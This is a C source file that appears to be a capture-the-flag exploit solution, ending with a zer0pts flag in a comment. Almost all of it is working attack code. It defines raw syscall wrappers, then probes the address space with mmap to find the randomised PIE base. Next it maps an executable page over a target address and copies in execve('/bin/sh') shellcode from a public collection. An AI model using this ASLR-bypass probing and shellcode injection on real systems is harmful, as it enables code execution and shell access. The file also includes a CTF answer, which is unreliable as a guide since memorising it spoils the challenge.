#include <stddef.h>
#include <sys/mman.h>
#include <unistd.h>

/* syscalls */

#define __NR_write 1
#define __NR_mmap 9
#define __NR_munmap 11

static long xsyscall(int number, long arg1, long arg2, long arg3, long arg4,
                     long arg5, long arg6) {
  register long rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long r10 asm("r10") = arg4;
  register long r8 asm("r8") = arg5;
  register long r9 asm("r9") = arg6;
  asm volatile("syscall"
               : "+r"(rax)
               : "r"(rdi), "r"(rsi), "r"(rdx), "r"(r10), "r"(r8), "r"(r9)
               : "memory");
  return rax;
}

static ssize_t xwrite(int fd, const void *buf, size_t count) {
  return xsyscall(__NR_write, fd, (long)buf, count, 0, 0, 0);
}

static long xmmap(void *addr, size_t length, int prot, int flags, int fd,
                  off_t offset) {
  return xsyscall(__NR_mmap, (long)addr, length, prot, flags, fd, offset);
}

__attribute__((used)) static long xmunmap(void *addr, size_t length) {
  return xsyscall(__NR_munmap, (long)addr, length, 0, 0, 0, 0);
}

/* libc functions */

static int xputs(const char *s) {
  xwrite(STDOUT_FILENO, s, __builtin_strlen(s));
  xwrite(STDOUT_FILENO, "\n", 1);
  return 0;
}

static char *xstrcpy(char *dest, const char *src) {
  int i = 0;
  while (src[i]) {
    dest[i] = src[i];
    i++;
  }
  dest[i] = 0;
  return dest;
}

static char *xstrcat(char *dest, const char *src) {
  int i = __builtin_strlen(dest);
  xstrcpy(dest + i, src);
  return dest;
}

static char *xultoa(unsigned long val, char *s, int radix) {
  static const char digits[] = "0123456789abcdef";
  int i = 0;
  do {
    s[i] = digits[val % radix];
    val /= radix;
    i++;
  } while (val);
  for (int j = 0; j < i / 2; j++) {
    s[j] ^= s[i - j - 1];
    s[i - j - 1] ^= s[j];
    s[j] ^= s[i - j - 1];
  }
  s[i] = 0;
  return s;
}

/* payload */

/* the inlining will cause a stack overflow */
__attribute__((noinline)) static void log_descent(unsigned long lo,
                                                  unsigned long hi, int depth,
                                                  int is_empty, int is_page) {
  char msg_buf[128];
  __builtin_memset(msg_buf, ' ', depth);
  char *msg = msg_buf + depth;
  xultoa(lo, msg, 16);
  xstrcat(msg, "-");
  xultoa(hi, msg + __builtin_strlen(msg), 16);
  xstrcat(msg, is_empty ? ": empty" : ": non-empty");
  if (!is_empty && is_page)
    xstrcat(msg, " [*]");
  xputs(msg_buf);
}

static unsigned long descend(unsigned long lo, unsigned long hi, int depth,
                             int early) {
  unsigned long length = hi - lo;
  int is_page = length == 0x1000;
  int is_empty =
      xmmap((void *)lo, length, PROT_NONE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0) == 0;
  if (is_empty && length < 0x100000000)
    xmunmap((void *)lo, length);
  log_descent(lo, hi, depth, is_empty, is_page);

  if (is_empty)
    return (unsigned long)-1;
  if (is_page)
    return lo;
  unsigned long mid = lo + (((length >> 12) / 2) << 12);
  unsigned long left = descend(lo, mid, depth + 1, early);
  if (left != (unsigned long)-1 && early)
    return left;
  unsigned long right = descend(mid, hi, depth + 1, early);
  return left == (unsigned long)-1 ? right : left;
}

__attribute__((noreturn, section(".entry"))) void entry(void) {
  unsigned long pie =
      descend(0x555555554000, 0x565555554000, /* depth = */ 0, /* early = */ 1);
  char msg_buf[128];
  xstrcpy(msg_buf, "pie=0x");
  xultoa((unsigned long)pie, msg_buf + __builtin_strlen(msg_buf), 16);
  xputs(msg_buf);
  unsigned long std_hex = pie + 0x2124;
  xstrcpy(msg_buf, "std_hex=0x");
  xultoa((unsigned long)std_hex, msg_buf + __builtin_strlen(msg_buf), 16);
  xputs(msg_buf);
  /* mmap() with MAP_FIXED installs a new mapping on overlap */
  /* the new mapping will mess up the syscall_abi array, so don't check the
   * return code, just assume that we are fine */
  xmmap((void *)(std_hex & ~0xFFFULL), 0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  /* http://shell-storm.org/shellcode/files/shellcode-806.php */
  __builtin_memcpy((void *)std_hex,
                   "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
                   "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
                   27);
  /* we can't exit(), because the syscall_abi array is messed up, so just die */
  __builtin_trap();
  /* zer0pts{mmap_1s_sup3r_d4ng3r0us:(} */
}
